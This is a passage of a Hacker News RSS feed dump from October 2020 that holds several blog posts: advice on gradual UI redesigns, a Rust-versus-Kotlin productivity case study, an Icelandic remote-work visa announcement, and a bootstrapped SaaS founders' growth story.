<h2><strong>What History Tells Us</strong></h2>
<p>Negative feedback from a large number of users can spread like wildfire on social media. Needless to say, that can be really detrimental to your brand and product.</p>
<p>If you‚Äôre a startup just starting out with a small user base, you have more leeway for major UI redesigns while you figure out your brand and voice. As your product grows, however, so does the need to prioritize your users‚Äô preferences.&nbsp;</p>
<p>Some companies with really big user bases learned the hard way so we don‚Äôt have to.&nbsp;</p>
<h3><strong>What Happened with Digg</strong></h3>
<p>In 2010, Digg, a news aggregate site very much like reddit, launched a redesign that caused them to lose 35% of their users nearly instantly.</p>
<p>In the Digg v4 update, the site was heavily revamped visually and functionally. Among many of the sudden changes, the downvote button was removed, users could no longer save posts to favorites or posts videos,&nbsp; their Upcoming page was gone, and the overall focus was shifted from user-submitted content to publisher-submitted content.&nbsp;</p>
<p>This major change didn‚Äôt just disorient their users. It took control away from them. With the new system, posts by publishers and sponsors flooded the front page, while posts by regular users were practically invisible.&nbsp;</p>
<p>The result of this? A mass exodus. Users either flooded the site with protest links (many of which were links to Reddit, their biggest competitor) or immediately migrated to Reddit.&nbsp;</p>
<h3><strong>What Happened with eBay</strong></h3>
<p>Once, eBay decided to change the background color of many of their site‚Äôs pages from bright yellow to white. Even though this change may seem like an obvious aesthetic choice today, it caused a ruckus on the internet (and in the team‚Äôs mailbox) when it first happened, forcing them to revert to yellow.</p>
<p>eBay didn‚Äôt give up on their vision, though. They came up with a strategy to go subtle, and designed an algorithm that faded the background from yellow to white, one shade at a time, over a few months. This time, the internet was still. The change was taking place so gradually that their users didn‚Äôt notice it was happening.</p>
<h2><strong>How Do You Safely Revamp?</strong></h2>
<p>Now that storytime is over, let‚Äôs talk about what we can learn from them. How can you revamp your product while being wary of change aversion?&nbsp;</p>
<p>Obviously, getting complaints from users doesn‚Äôt mean you should stop updating your app or website. <span>M</span>aintenance is necessary for your product to thrive and continue thriving.<span> The secret lies in </span><em><span>how</span></em><span> you execute it.</span></p>
<h3><strong>Change Little and Often</strong></h3>
<p>Instead of giving your users a whole new interface to relearn at one go, introduce a little change at a time. Habits take time to unlearn. Giving users one small redirection at a time is a lot less disorienting and burdensome for them.</p>
<h3><strong>Give Users a Heads-up&nbsp;</strong></h3>
<p>Before you launch your redesign, give users time to prepare for it. This will dampen the impact of the launch and reduce the risk of shocking them into frustration with your product.&nbsp;</p>
<h3><strong>Spell Out the Values</strong></h3>
<p>As mentioned before, values are invisible. Users don‚Äôt always immediately see the benefits of your new interface when they first try it. Instead of waiting for them to figure the maze out on their own, give them the lowdown on how the changes you‚Äôve implemented are designed to solve the problems they face.</p>
<h3><strong>Provide Guidance</strong></h3>
<p>Part of spelling out the values of your redesign is by easing your users‚Äô transition to your new interface. When you provide tutorials and demonstratives, you‚Äôre also teaching them how the new design improves their experience on your app or website.</p>
<h3><strong>Provide Options</strong></h3>
<p>It‚Äôs always good to give your users the option to switch back to the old interface. Provide them a toggle switch or button to revert to the old version, and place it somewhere easily accessible.</p>
<h3><strong>Welcome Feedback</strong></h3>
<p>Give your users an outlet or channel through which they can directly communicate with your team. Whether it‚Äôs a form on your website, or simply an email address they can write to specifically for complaints and feedback, it‚Äôs always good to let your users know that you‚Äôre listening.</p>
<h2><strong>We‚Äôre Here to Help</strong></h2>
<p>Snappymob is equipped with software developers and designers who understand user behavior. Our team has helped clients from startups to large corporations, within and beyond Malaysia, launch successful revamps and redesigns.</p>
<p>With our help, you can rest assured that your redesigns launch safely. Click <a href="https://www.snappymob.com/contact"><span>here</span></a> to reach out to us!</p>
</span></p><p><label>app design</label></p>
        
      </div></div>]]>
            </description>
            <link>https://blog.snappymob.com/sudden-changes-in-ui-why-its-a-bad-move</link>
            <guid isPermaLink="false">hacker-news-small-sites-24929443</guid>
            <pubDate>Thu, 29 Oct 2020 11:43:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[For Complex Applications, Rust Is as Productive as Kotlin]]>
            </title>
            <description>
<![CDATA[
Score 22 | Comments 3 (<a href="https://news.ycombinator.com/item?id=24929335">thread link</a>) | @todsacerdoti
<br/>
October 29, 2020 | https://ferrous-systems.com/blog/rust-as-productive-as-kotlin/ | <a href="https://web.archive.org/web/*/https://ferrous-systems.com/blog/rust-as-productive-as-kotlin/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div id="preamble">
<div>
<p>In this article, we will compare one apple (IntelliJ Rust) to one orange (rust-analyzer) to reach general and sweeping conclusions.
Specifically, I want to present a case study supporting the following claim:</p>
<p>For complex applications, Rust is as productive as Kotlin.</p>
<p>For me, this is an unusual claim to argue: I always thought exactly the opposite, but I am not so sure now.
I came to Rust from C++.
I was of the opinion that this is a brilliant low-level language and always felt puzzled at people writing higher-level things in Rust.
Clearly, choosing Rust means taking a productivity hit, and using Kotlin, C# or Go just makes much more sense if you can afford GC.
My <a href="https://matklad.github.io/2020/09/20/why-not-rust.html">list of Rust criticisms</a> starts with this objection.</p>
<p>What moved my position in the other direction was my experience as the lead developer of rust-analyzer and IntelliJ Rust.
Let me introduce the two projects.</p>
<p><a href="https://github.com/intellij-rust/intellij-rust"><strong>IntelliJ Rust</strong></a> is the plugin for IntelliJ Platform, providing Rust support.
In effect, it is a Rust compiler front-end, written in Kotlin and making use of language-support features of the platform.
These features include lossless syntax trees, a parser generator, persistence and indexing infrastructure, among others.
Nonetheless, as programming languages differ lot, the bulk of logic for analyzing Rust is implemented in the plugin itself.
Presentational features like completion list come from the platform, but most of the language semantics is hand-written.
IntelliJ Rust also includes a bit of a Swing GUI.</p>
<p><a href="https://github.com/rust-analyzer/rust-analyzer"><strong>rust-analyzer</strong></a> is an implementation of
<a href="https://microsoft.github.io/language-server-protocol/">Language Server Protocol</a> for Rust.
It is a Rust compiler front-end written from scratch with an eye towards IDE support.
It makes heavy use of <a href="https://github.com/salsa-rs/salsa">salsa</a> library for incremental computations.
Beyond the compiler itself, rust-analyzer includes code for managing long-lived multithreaded process of the language server itself.</p>
<p>The projects are essentially equivalent in scope‚Äâ‚Äî‚Äârust compiler front-ends suitable for IDEs.
The two biggest differences are:</p>
<div>
<ul>
<li>
<p>IntelliJ Rust is a plugin, so it can re-use code and design patterns of the surrounding platform.</p>
</li>
<li>
<p>rust-analyzer is the second system, so it leverages experience of IntelliJ Rust for a from-scratch design.</p>
</li>
</ul>
</div>
<p>The internal architecture of the two projects also differs a lot.
In terms of <a href="https://rust-analyzer.github.io/blog/2020/07/20/three-architectures-for-responsive-ide.html">Three Architectures</a>, IntelliJ Rust is map-reduce, and rust-analyzer is query-based.</p>
<p>Writing an IDE-ready compiler is a high-level task.
You don‚Äôt need to talk to the operating system directly.
There are some fancy data structures and concurrency here and there, but they are also high-level.
It‚Äôs not about implementing crazy lock-free schemes, it‚Äôs about maintaining application state and sanity in the multithreaded world.
The bulk of the compiler is symbolic manipulation, arguably best suited for lisp.
Picking a VM-based language for such task (for example, OCaml), doesn‚Äôt have any intrinsic downsides.</p>
<p>At the same time, the task is pretty complex and unique.
The ratio of ‚Äúyour code‚Äù vs ‚Äúframework code‚Äù when implementing features is much higher than in a typical CRUD backend.</p>
<p>Now that the projects are introduced, lets take two roughly equivalent slices of history.</p>

<p>Both are about 2 years old, with 1-1.5 developers working full time and vibrant and thriving community of open-source contributors.
There are 52k lines of Kotlin and 66k lines of Rust.</p>
<p>Both delivered roughly equivalent feature sets at that time.
To be honest, I still don‚Äôt really believe this :)
rust-analyzer started from zero, it didn‚Äôt have a decade worth of Java classes to bootstrap from, and the productivity drop between Kotlin and Rust is supposed to be huge.
But it‚Äôs hard to argue with reality.
Instead, let me try to reflect on my experience building both, and to try to explain Rust‚Äôs surprising productivity.</p>
</div>
</div>
<div>
<h2 id="_learning_curve">Learning Curve</h2>
<div>
<p>It‚Äôs easy to characterize Kotlin‚Äôs learning curve‚Äâ‚Äî‚Äâit is nearly zero.
I‚Äôve started IntelliJ Rust without Kotlin experience and never felt that I need to specifically learn Kotlin.</p>
<p>When I switched to rust-analyzer, I was pretty experienced with Rust.
I would say that one definitely needs to deliberately learn Rust, it‚Äôs hard to pick it up on the go.
Ownership and aliasing control are novel concepts (even if you come from C++), and taking holistic approach to learning them pays off.
After the initial learning step the ride is generally smooth.</p>
<p>By the way, this is the perfect place to plug our Rust courses and tailor-made <a href="https://ferrous-systems.com/training/">trainings</a> :-)
The next <a href="https://ferrous-systems.com/training/#package-intro-training">introduction to Rust</a> is happening this December!</p>
</div>
</div>
<div>
<h2 id="_modularity">Modularity</h2>
<div>
<p>This I think is the biggest factor.
Both projects are moderately large in terms of scope as well as in terms of amount of source code.
I believe that the only way to ship big things is to split them in independent-ish chunks and implement the chunks separately.</p>
<p>I also find most of the languages I am familiar with to be pretty horrible with respect to modularity.
More generally, I am amused with FP vs OO debate, as it seems that ‚Äúwhy no one does modules right?‚Äù is a more salient issue.</p>
<p>Rust is one of the few languages which has first-class concept of libraries.
Rust code is organized on two levels:</p>
<div>
<ul>
<li>
<p>as a tree of inter-dependent modules inside a crate</p>
</li>
<li>
<p>and as a directed acyclic graph of crates</p>
</li>
</ul>
</div>
<p>Cyclic dependencies are allowed between the modules, but not between the crates.
Crates are units of reuse and privacy: only crate‚Äôs public API matters, and it is crystal clear what crate‚Äôs public API is.
Moreover, crates are anonymous, so you don‚Äôt get name conflicts and dependency hell when mixing several versions of the same crate in a single crate graph.</p>
<p>This makes it very easy to make two pieces of code <strong>not</strong> depend on each other (non-dependencies are the essence of modularity): just put them in separate crates.
During code review, only changes to Cargo.tomls need to be monitored carefully.</p>
<p>At the time of comparison, rust-analyzer is split into 23 internal crates, with a handful general-purposed ones released on crates.io.
In contrast, IntelliJ Rust is a single Kotlin module, where everything can depend on everything else.
Although internal organization of IntelliJ Rust is pretty clean, it‚Äôs not reflected in the file system layout and build system, and needs constant maintenance.</p>
</div>
</div>
<div>
<h2 id="_build_system">Build System</h2>
<div>
<p>Managing project‚Äôs build takes significant amount of times, and has multiplicative effect on everything else.</p>
<p>Rust‚Äôs build system, <a href="https://doc.rust-lang.org/cargo/index.html">Cargo</a>, is very good.
It‚Äôs not perfect, but it is a breath of fresh air after Java‚Äôs <a href="https://gradle.org/">Gradle</a>.</p>
<p>Cargo‚Äôs trick is that it doesn‚Äôt try to be a general purpose build system.
It can only build Rust projects, and it has rigid expectation about the project structure.
It‚Äôs impossible to opt out of the core assumptions.
Configuration is a static non-extensible TOML file.</p>
<p>In contrast, Gradle allows free-form project structure, and is configured via a Turing complete language.
I feel like I‚Äôve spend more time learning Gradle than learning Rust!
Running <code>wc -w</code> gives 182_817 words for Rust book, and 280_506 for Gradle‚Äôs user guide.</p>
<p>Additionally, Cargo is just faster than Gradle in most cases.</p>
<p>Of course, the biggest downside is that custom build logic is not expressible in Cargo.
Both projects needs substantial amount of logic beyond mere compilation to deliver the final result to the user.
For rust-analyzer, this is handled by hand-written Rust script, which works perfectly at this scale.</p>
</div>
</div>
<div>
<h2 id="_ecosystem">Ecosystem</h2>
<div>
<p>Language-level support for libraries and top-notch build system/package manager allow for a thriving ecosystem.
rust-analyzer relies on third-party libraries much more than IntelliJ Rust.
Some parts of rust-analyzer are also published to crates.io for other projects to reuse.</p>
<p>Additionally, low-level nature of the Rust programming language often allows for ‚Äúperfect‚Äù library interfaces.
Interfaces which exactly reflect the underlying problem, without imposing intermediate language-level abstractions.</p>
</div>
</div>
<div>
<h2 id="_basic_conveniences">Basic Conveniences</h2>
<div>
<p>I feel that Rust is significantly more productive when it comes to basic language nuts and bolts‚Äâ‚Äî‚Äâstructs, enums, functions, etc.
This is not specific to Rust‚Äâ‚Äî‚Äâany ML-family language has them.
However, Rust is the first industrial language which wraps these features in a nice package, not constrained by backwards compatibility.
I want to list specific features which I think allow producing maintainable code faster in Rust</p>
<p><em>Emphasis on data over behavior</em>.
Aka, Rust is not an OOP language.
The core idea of OOP is that of dynamic dispatch‚Äâ‚Äî‚Äâwhich code is invoked by a function call is decided at runtime (late binding).
This is a powerful pattern which allows for flexible and extensible system.
The problem is, extensibility is costly!
It‚Äôs better only to apply it in certain designated areas.
Designing for extensibility by default is not cost effective.
Rust puts static dispatch front and center: it is mostly clear whats going on by just reading the code, as it is independent of runtime types of the objects.</p>
<p>One small syntactic thing I enjoy about Rust is how it puts fields and methods into different blocks syntactically:</p>
<div>
<div>
<pre><code data-lang="rust"><span>struct</span> <span>Person</span> <span>{</span>
  <span>first_name</span><span>:</span> <span>String</span><span>,</span>
  <span>last_name</span><span>:</span> <span>String</span><span>,</span>
<span>}</span>

<span>impl</span> <span>Person</span> <span>{</span>
    <span>fn</span> <span>full_name</span><span>(</span><span>&amp;</span><span>self</span><span>)</span> <span>-&gt;</span> <span>String</span> <span>{</span>
        <span>...</span>
    <span>}</span>
<span>}</span></code></pre>
</div>
</div>
<p>Being able to see at a glance all the fields makes understanding the code much simpler.
Fields convey much more information than methods.</p>
<p><em>Sum types</em>.
Rust‚Äôs humbly named enums are full algebraic data types.
This means that you can express the idea of disjoint union:</p>
<div>
<div>
<pre><code data-lang="rust"><span>enum</span> <span>Either</span><span>&lt;</span><span>A</span><span>,</span> <span>B</span><span>&gt;</span> <span>{</span> <span>A</span><span>(</span><span>A</span><span>),</span> <span>B</span><span>(</span><span>B</span><span>)</span> <span>}</span></code></pre>
</div>
</div>
<p>This is hugely useful in day-to-day programming in the small, and some times during programming in the large as well.
To give one example, one of the core concepts for an IDE are references and definitions.
A definition a like <code>let foo = 92;</code> assigns a name to an entity which can be used down a line.
A reference like <code>foo + 90</code> <em>refers</em> to some definition.
When you ctrl-click on reference, you go to the definition.</p>
<p>Natural way to model that in Kotlin is by adding <code>interface Definition</code> and <code>interface Reference</code>.
The problem is, some things are ‚Ä¶</p></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://ferrous-systems.com/blog/rust-as-productive-as-kotlin/">https://ferrous-systems.com/blog/rust-as-productive-as-kotlin/</a></em></p>]]>
            </description>
            <link>https://ferrous-systems.com/blog/rust-as-productive-as-kotlin/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24929335</guid>
            <pubDate>Thu, 29 Oct 2020 11:27:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Iceland paves the way for remote (tele)workers]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24929202">thread link</a>) | @justkd
<br/>
October 29, 2020 | https://www.government.is/news/article/2020/10/27/-Foreign-experts-can-work-remotely-in-Iceland/ | <a href="https://web.archive.org/web/*/https://www.government.is/news/article/2020/10/27/-Foreign-experts-can-work-remotely-in-Iceland/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main">
<div><article data-last-modified="2020-10-27 17:36:00" data-category="type:News"><header><strong><time>October 27, 2020 </time><span>Ministry of Industries and Innovation, Ministry of Justice, Ministry of Finance and Economic Affairs</span></strong></header><div><figure><a href="https://www.government.is/library/01-Ministries/Ministry-of-Industries-and-Innovation/IMG_4200.jpg" data-lightbox="news-image" data-title="Ms. √Åslaug Arna Sigurbj√∂rnsd√≥ttir, Minister of Justice, Ms. √û√≥rd√≠s Kolbr√∫n Reykfj√∂r√∞ Gylfad√≥ttir, Minister of Tourism, Industry and Innovation, Mr. Bjarni Benediktsson, Minister of Finance and Economic affairs."><img src="https://www.government.is/library/01-Ministries/Ministry-of-Industries-and-Innovation/IMG_4200.jpg?proc=singleNewsItem" alt="Ms. √Åslaug Arna Sigurbj√∂rnsd√≥ttir, Minister of Justice, Ms. √û√≥rd√≠s Kolbr√∫n Reykfj√∂r√∞ Gylfad√≥ttir, Minister of Tourism, Industry and Innovation, Mr. Bjarni Benediktsson, Minister of Finance and Economic affairs. - mynd"></a><span></span></figure></div><section><p>The Minister of Tourism, Industry, and Innovation, the Minister of Justice and the Minister of Finance and Economic Affairs have put in place measures to enable non-EEA foreign nationals to reside in Iceland for up to six months and telework for foreign companies. With the measure, those foreign citizens, who are exempt from the visa requirements, will be allowed to apply for a long-term visa in Iceland for teleworkers and bring their families without having to move their legal domicile to the country or obtain Icelandic ID numbers.</p>
<p>In the wake of the COVID-19 epidemic, many companies around the world have made significant changes to the way they operate and are now increasingly allowing and encouraging their staff to telework. The result is that in many instances the staff member can choose their home environment, irrespective of the location of their workplace.</p>
<p>Ms. √û√≥rd√≠s Kolbr√∫n Reykfj√∂r√∞ Gylfad√≥ttir, Minister of Tourism, Innovation and Industry:</p>
<p><em><span>‚ÄúWe need to shape our export industry, based on ingenuity and by making it easier for foreign nationals to work from Iceland, we add value, knowledge and connections in Iceland that support our innovation environment.‚Äù</span></em></p>
<p>At the initiative of the Minister of Innovation, in collaboration with the Ministry of Justice and Ministry of Finance and Economic Affairs, an authorization has been implemented for those who are permanently employed with foreign companies so that they can stay and work in Iceland for up to six months. Until now the authorisation has only been for 90 days. In order to be granted permission for this longer stay, the person in question must demonstrate an employment relationship, income and health insurance. The Icelandic government will keep looking into the matter to find ways of extending the time period, but for now regulations have been changed to accommodate the six month period.</p>
<p>Mr. Bjarni Benediktsson, Minister of Finance and Economic Affairs:</p>
<span>‚Äú<em>We want to ensure that with regards to taxation, there is nothing to prevent the possibility of temporarily allowing individuals working for foreign companies to work from Iceland. We believe that these individuals will bring with them valuable experience and connections that will benefit Iceland on its path to economic recovery from effects of the Covid-19 pandemic</em><span>‚Äù</span>&nbsp;</span>
<p>Ms. √Åslaug Arna Sigurbj√∂rnsd√≥ttir, Minister of Justice:&nbsp;</p>
<p>
<span>‚Äú<em>Fast technological developments call for us to be open and flexible to the growing opportunities available to us that arise when more employers encourage teleworking. The regulatory framework must take this into account.</em>‚Äù</span></p>
<p>Promote Iceland will provide further information and handle promotion of the initiative: <a href="https://www.government.is/cdn-cgi/l/email-protection#a2d5cdd0c9e2cbc1c7cec3ccc68ccbd1"><span data-cfemail="e5928a978ea58c868089848b81cb8c96">[email&nbsp;protected]</span></a>.&nbsp;</p></section><h2>Tags</h2></article></div>

</div><div>
<div>
<p>This website uses cookies to ensure you get the best experience on our website. <a href="https://www.government.is/default.aspx?pageid=c7a1ba64-7428-4803-90e2-cbce7fd71d9b">Read more</a></p>
</div>
</div></div>]]>
            </description>
            <link>https://www.government.is/news/article/2020/10/27/-Foreign-experts-can-work-remotely-in-Iceland/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24929202</guid>
            <pubDate>Thu, 29 Oct 2020 11:07:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Our Story: 2 People, No Funding, $700k+ ARR in Less Than 3 Years]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24929051">thread link</a>) | @yosid
<br/>
October 29, 2020 | https://provesrc.com/blog/celebrating-3-years/ | <a href="https://web.archive.org/web/*/https://provesrc.com/blog/celebrating-3-years/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			<p><strong>TLDR:</strong> Stories and takeaways from growing ProveSource from 0 to $700k ARR as a 2-person team in less than 3 years and with no funding.</p>
<p><img loading="lazy" src="https://provesrc.com/blog/wp-content/uploads/2020/10/3-year-story-cover.png" alt="3 year story provesource" width="1920" height="1080" srcset="https://provesrc.com/blog/wp-content/uploads/2020/10/3-year-story-cover.png 1920w, https://provesrc.com/blog/wp-content/uploads/2020/10/3-year-story-cover-300x169.png 300w, https://provesrc.com/blog/wp-content/uploads/2020/10/3-year-story-cover-1024x576.png 1024w, https://provesrc.com/blog/wp-content/uploads/2020/10/3-year-story-cover-768x432.png 768w, https://provesrc.com/blog/wp-content/uploads/2020/10/3-year-story-cover-1536x864.png 1536w" sizes="(max-width: 767px) 89vw, (max-width: 1000px) 54vw, (max-width: 1071px) 543px, 580px"></p>
<h2><strong>Our false start</strong></h2>
<p>We started the company in June 2015 with no real idea.</p>
<p>Most people we know fail to ever get started because they‚Äôre looking for the perfect idea.</p>
<p>As the founder of Instagram famously said:</p>
<p>‚ÄúIt‚Äôs about going through false starts. The best companies in the world have all had predecessors. YouTube was a dating site. You always have to evolve into something else.‚Äù</p>
<p>We brainstormed for several days and because both myself and Natan (my co-founder) are very good with mobile app development (iOS &amp; Android) we decided to build a personalization platform for mobile apps and sell it to enterprises.</p>
<p>Around 2.5 years later, having invested almost $100k out of our own pockets, having done hundreds of calls and demos with huge enterprises and dozens of Proof of Concepts, we decided it‚Äôs time to move on‚Ä¶</p>
<p>It felt awful ‚Äì like you‚Äôre killing something you love, but it had to be done.</p>
<p>That was our ‚Äúfalse start‚Äù. But more on that another time.</p>
<p><strong>üß† Lesson learned:</strong></p>
<p>The sooner you kill an idea that is getting no traction, even if it‚Äôs super hard because it‚Äôs your baby, the less painful it is. The more time and resources you devote, the harder it becomes to pull out in case things don‚Äôt work out.</p>
<h2><strong>Starting over ‚Äì The lean way</strong></h2>
<p>In January 2018 we decided to start working on a new SaaS product.</p>
<p>The idea was to ‚Äústeal‚Äù the social proof hack that Booking.com was using (e.g. 5 people booked this hotel, etc.) and create a platform from it ‚Äì a social proof marketing platform.</p>
<p>This time, because we were running on fumes, both in terms of cash and motivation, we decided to validate the idea first.</p>
<p>We had a single purpose in mind ‚Äì getting 100 leads interested in our product.</p>
<p>We created a landing page that showcased our new idea as a real product, including pricing, a signup button, and all ‚Äì a social proof marketing platform for mobile apps.</p>
<p><img loading="lazy" src="https://provesrc.com/blog/wp-content/uploads/2020/10/landing-page-for-product-validation-ps.png" alt="" width="1920" height="1080" srcset="https://provesrc.com/blog/wp-content/uploads/2020/10/landing-page-for-product-validation-ps.png 1920w, https://provesrc.com/blog/wp-content/uploads/2020/10/landing-page-for-product-validation-ps-300x169.png 300w, https://provesrc.com/blog/wp-content/uploads/2020/10/landing-page-for-product-validation-ps-1024x576.png 1024w, https://provesrc.com/blog/wp-content/uploads/2020/10/landing-page-for-product-validation-ps-768x432.png 768w, https://provesrc.com/blog/wp-content/uploads/2020/10/landing-page-for-product-validation-ps-1536x864.png 1536w" sizes="(max-width: 767px) 89vw, (max-width: 1000px) 54vw, (max-width: 1071px) 543px, 580px"></p>
<p>The fastest way to get targeted traffic to your website is to use Google Ads targeting the brand names of the biggest players in your niche.</p>
<p>So we did that.</p>
<p>We also posted the landing page anywhere we could think of: Reddit, ProductHunt, BetaList, social media, wherever‚Ä¶</p>
<p>About one month and ‚Äì $300 later, we had around 200 leads that wanted to try out ProveSource.</p>
<p>We were finally making progress!</p>
<p>We figured that even if only 1% of them converted, we would already have 2 paying customers.</p>
<p><strong>üß† Lesson learned:</strong></p>
<p>You can easily get traction without having a product.</p>
<p>Just buy a domain, build a landing page, and go validate your business idea.</p>
<p>We usually create landing pages to validate products using plain HTML and Airtable, to send the leads we collect from the forms. No fancy designs, no expensive CRM.</p>
<h2><strong>Making our first dollar $</strong></h2>
<p>Next goal ‚Äì how do we make a dollar?</p>
<p>That is, unlike our previous product which made practically $0 in 2.5 years.</p>
<p>We created a rule that whenever we launch a new product, all our efforts will be towards making our first dollar, so we can have real-life validation.</p>
<p>So we have 200 people interested in ProveSource.</p>
<p>Now we needed to give them a product and get them to pay.</p>
<p>We built the leanest MVP possible:</p>
<ul>
<li>A product just for website owners (mobile was too small of a niche).</li>
<li>You could only show how many page visitors you had on your website.</li>
<li>The whole UI and UX should be super simple. No menus and extra buttons, don‚Äôt give users a reason to abandon your product.</li>
</ul>
<p>Did you forget your password and need to reset it? Sorry, no can do.</p>
<p>Did we accidentally change your password when you logged in? Oops, we‚Äôre on it.</p>
<p>What are onboarding and email automation? Dunno, don‚Äôt care.</p>
<p>April 2018 ‚Äì we are approached by a Facebook Group admin that is interested in promoting our product to his group as a ‚Äúlifetime deal‚Äù (LTD).</p>
<p>This means selling a lifetime subscription to your product for a one-off payment ranging from $39-$99.</p>
<p>We‚Äôve never heard of this before so we thought long and hard about the consequences of selling a lifetime deal and how it would position the product and our company‚Ä¶</p>
<p>We decided to go with the deal and ran it with the group for 1 week.</p>
<p>We generated over $7k revenue, got tons of feedback, ideas for product improvements, tons of bugs were discovered in the process, which taught us the value of having live chat support.</p>
<p><strong>üß† Lesson learned:</strong></p>
<p>In hindsight, there were no real consequences, only advantages to running a lifetime deal.</p>
<p>Sure, you have a few dozens of customers that are not paying you on a recurring basis ‚Äì but they help a lot in the beginning when you need the cash and the validation.</p>
<p>Once we were done with the LTD we started pushing the product in all marketing channels and to our 200 user waiting list. None of them converted by the way.</p>
<p>A couple of days later we got our first monthly subscription customer ($19/month).</p>
<p>It was an amazing moment, validating that you indeed have a real business opportunity in your hands.</p>
<h2><strong>Our ‚Äúwow moment‚Äù</strong></h2>
<p>During the next months, we focused on spreading the word, squashing bugs, and doing tons of support for our existing customers.</p>
<p>How did we decide what to build next?</p>
<ul>
<li>We learned to ask questions about our product‚Äôs value. Why do people buy our product? Is it because they want to increase conversions? How do we help them achieve that?</li>
<li>We brainstormed about what it means to be a social proof platform.</li>
<li>We heard our customers‚Äô feedback</li>
<li>We learned from competitors; but not too much. We found that those who only copy will always lag behind.</li>
</ul>
<p>This whole process has to be accompanied by analytics and metrics.</p>
<p>You don‚Äôt have to measure each and every step or A/B test you do, though.</p>
<p>We don‚Äôt really do it, to this day.</p>
<p>A lot of product leaders talk about the ‚Äúwow effect‚Äù or ‚Äúwow moment‚Äù ‚Äì if you want to retain users, make them say ‚Äúwow‚Äù.</p>
<p>For Facebook, for example, their ‚Äúwow moment‚Äù is logging into their platform and seeing familiar faces. That‚Äôs why they make sure that during sign up, you connect with as many people you know on Facebook as possible.</p>
<p>In our case, we focused on improving our user onboarding.</p>
<p>Since the product requires users to install a javascript snippet on their website, we put a big emphasis on making that process as easy as possible.</p>
<p>Our thought was ‚Äì if users can see a social proof notification on their website, they‚Äôll get to that ‚Äúwow moment‚Äù.</p>
<p>We can see a very close correlation between successful onboarding and someone becoming a paying customer.</p>
<p>The funnel looks like this:</p>
<ul>
<li>8-10% of visitors will signup.</li>
<li>70% of those signups will complete the onboarding.</li>
<li>7-10% of those users who are onboarded will eventually become paying customers.</li>
</ul>
<p><img loading="lazy" src="https://provesrc.com/blog/wp-content/uploads/2020/10/ProveSource-Signups-Funnel.png" alt="ProveSource Signups Funnel" width="1920" height="1080" srcset="https://provesrc.com/blog/wp-content/uploads/2020/10/ProveSource-Signups-Funnel.png 1920w, https://provesrc.com/blog/wp-content/uploads/2020/10/ProveSource-Signups-Funnel-300x169.png 300w, https://provesrc.com/blog/wp-content/uploads/2020/10/ProveSource-Signups-Funnel-1024x576.png 1024w, https://provesrc.com/blog/wp-content/uploads/2020/10/ProveSource-Signups-Funnel-768x432.png 768w, https://provesrc.com/blog/wp-content/uploads/2020/10/ProveSource-Signups-Funnel-1536x864.png 1536w" sizes="(max-width: 767px) 89vw, (max-width: 1000px) 54vw, (max-width: 1071px) 543px, 580px"></p>
<p><strong>üß† Lesson learned:</strong></p>
<p>Find what your ‚Äúwow moment‚Äù is in your users‚Äô experience, and make sure you get users to experience it as early in the onboarding process as possible. That way you can spend a lot on User Acquisition activities because the users you bring in end up becoming paying customers and sticking with you.</p>
<h2><strong>Our First Growth ‚ÄúHack‚Äù</strong></h2>
<p>After we added some ‚Äúnecessary‚Äù features like showing recent sales and polishing the product to have fewer bugs ‚Äì we wanted to grow bigger, we wanted to scale up, we wanted to get more exposure.</p>
<p>How do you scale a notifications product that is essentially an add-on for websites?</p>
<p>You build integrations for all website builders.</p>
<p>So we worked hard on adding more and more integrations: <a href="https://wordpress.org/plugins/provesource/">WordPress plugin</a>, <a href="https://apps.shopify.com/provesource">Shopify app</a>, Magento plugin, Wix app, <a href="https://zapier.com/apps/provesource/integrations">Zapier</a>, <a href="https://www.bigcommerce.com/apps/provesource-social-proof/">BigCommerce</a>, and more.</p>
<p>All of these marketplaces and app stores proved to be really good traffic sources and traction channels for us, each with its own audience and unique requirements.</p>
<p>Today, around 20% of our customers and revenue comes from Shopify alone.</p>
<h2><strong>Scaling past 2 people</strong></h2>
<p>Being a two-person team that does development, marketing, support, accounting, and more is tough. But it also teaches you a lot, you learn so much about your business, your audience, and your customers.</p>
<p>And that gives you the experience you need on what to look for when hiring someone to take over some of your responsibilities.</p>
<p>In September 2019 we decided it‚Äôs time to scale the team.</p>
<p>After all, a great company can‚Äôt be just 2 people, right?</p>
<p>Naturally, a software company‚Äôs first hire would be a developer.</p>
<p>Bringing Dima to the team, allowed us to build more integrations faster, and scale the company beyond its initial stage.</p>
<p>So we now have tons of integrations, pretty much with any large marketing or website platform out there.</p>
<p>We also scaled and optimized our Google and Facebook ads as much as we could.</p>
<p>We optimized our product onboarding rate, increased prices, added great features, and made it even easier to use the product, by adding tooltips, auto-suggestions, wizards, and more.</p>
<p>We were growing at a steady rate, so what could possibly be bothering us?</p>
<p>Well, we didn‚Äôt know how to grow faster, or what to do next.</p>
<p>We came up with a few ideas:</p>
<ul>
<li>Bring a Growth team member to scale our marketing efforts and bring new ideas to the table.</li>
<li>Since our product offering is strong and we couldn‚Äôt think about any impactful feature we could develop ‚Äì we thought about zooming out of our product‚Äôs initial market.</li>
<li>Build a new product ‚Äì we have no investors so we are free to make any decision we want about the company‚Äôs direction. Investors often block the founders from doing whatever is best for the company and push for a point where they can exit.</li>
</ul>
<h2><strong>Building a new product</strong></h2>
<p>At this point, we decided to build another product to scale the company further.</p>
<p>We had these questions in mind before picking what to work on:</p>
<ul>
<li>How big is the market, is it potentially bigger than our current product?</li>
<li>Would our existing customers be customers of this new product too?</li>
<li>What do our existing customers need and are willing to pay for?</li>
</ul>
<p>Adding ProveSource to your website is great, but, there is a critical prerequisite to making it work for you and your website: traffic. If your website has no traffic, you won‚Äôt be able to generate social proof.</p>
<p>Here‚Äôs the ‚Ä¶</p></div></div>
